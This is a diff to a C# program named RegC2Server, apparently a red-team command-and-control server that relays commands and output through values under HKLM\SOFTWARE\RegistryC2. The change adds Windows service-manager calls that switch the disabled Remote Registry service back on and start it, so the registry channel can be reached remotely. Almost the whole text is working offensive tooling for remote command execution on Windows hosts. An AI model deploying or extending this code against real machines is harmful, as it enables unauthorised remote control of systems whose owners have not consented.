@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Runtime.InteropServices;
 using System.Security.AccessControl;
 using System.Security.Principal;
 using System.ServiceProcess;
@@ -7,8 +8,47 @@ using Microsoft.Win32;
 
 namespace RegC2Server
 {
+
     internal class Program
     {
+        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
+
+
+        static bool EnableRemoteRegistry()
+        {
+            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
+            if (SCMHandle == null)
+            {
+                Console.WriteLine("[-] Failed to get SCM handle...");
+                return false;
+            }
+
+            IntPtr schService = OpenService(SCMHandle, "Remoteregistry", 0xF01FF);
+            if (schService == null)
+            {
+                Console.WriteLine("[-] Failed to get sch pointer...");
+                return false;
+            }
+
+            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, null, null, null, null, null, null, null);
+            if (!success)
+            {
+                Console.WriteLine("[-] Failed to Change remoteregistry startup...");
+                return false;
+            }
+
+            Console.WriteLine("[+] Remoteregistry Service no longer disabled...");
+            return true;
+        }
+
 
         static void RunCmd(string registrykey, string cmd)
         {
@@ -25,11 +65,10 @@ namespace RegC2Server
                 Console.WriteLine(ex.Message);
                 return;
             }
-            Console.WriteLine("[*]Cmd updated to: {0}", myReg.GetValue("cmd"));
+            Console.WriteLine("[+] Cmd updated to: {0}", myReg.GetValue("cmd"));
 
             //Read output when available
             myReg.SetValue("output", "");
-            Console.WriteLine(myReg.GetValue("output").ToString().Equals(""));
             while(true)
             {
                 if (myReg.GetValue("output").ToString().Length > 0)
@@ -83,8 +122,20 @@ namespace RegC2Server
 
             ServiceController sc = new ServiceController();
             sc.ServiceName = "Remoteregistry";
-            Console.WriteLine("[!] The Remote Registry service status is currently set to {0}",
-                               sc.Status.ToString());
+
+            if (sc.StartType == ServiceStartMode.Disabled) 
+            {
+                Console.WriteLine("[!] Remoteregistry Service is disabled... Trying to enable it");
+                if (!EnableRemoteRegistry())
+                {
+                    Console.WriteLine("[-] Failed to enable Remoteregistry... Sure you are an administrator?");
+                    Environment.Exit(0);
+                }
+            } else
+            {
+                Console.WriteLine("[+] Remoteregistry already enabled...");
+            }
+
             if (sc.Status == ServiceControllerStatus.Stopped || sc.Status == ServiceControllerStatus.StopPending || sc.Status == ServiceControllerStatus.Paused)
             {
                 Console.WriteLine("[!] Remote Registry is not running... Trying to start it");
@@ -106,7 +157,7 @@ namespace RegC2Server
                 }
 
             }
-            Console.WriteLine("[+] Remoteregistry Seems to be running already...");
+            Console.WriteLine("[+] Remoteregistry seems to be running already...");
             return true;
         }
 
@@ -121,7 +172,7 @@ namespace RegC2Server
 
             if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey, false) == null)
             {
-                Console.WriteLine("Registry key doesn't exist. Trying to create them...");
+                Console.WriteLine("[!] Registry key {0} doesn't exist. Trying to create it: ", @"HKLM\SOFTWARE\RegistryC2\" + registrykey);
                 try
                 {
                     RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\RegistryC2\" + registrykey);
@@ -156,7 +207,7 @@ namespace RegC2Server
             {
                 try
                 {
-                    Console.WriteLine("[*] Applying rule to: " + myReg.Name);
+                    Console.WriteLine("[+] Applying rule to: " + myReg.Name);
                     rs.AddAccessRule(new RegistryAccessRule(si,
                     RegistryRights.WriteKey
                     | RegistryRights.ReadKey
@@ -174,7 +225,7 @@ namespace RegC2Server
             {
                 try
                 {
-                    Console.WriteLine("[*] Removing rule for:" + myReg.Name);
+                    Console.WriteLine("[+] Removing rule for:" + myReg.Name);
                     rs.RemoveAccessRule(new RegistryAccessRule(si,
                     RegistryRights.WriteKey
                     | RegistryRights.ReadKey
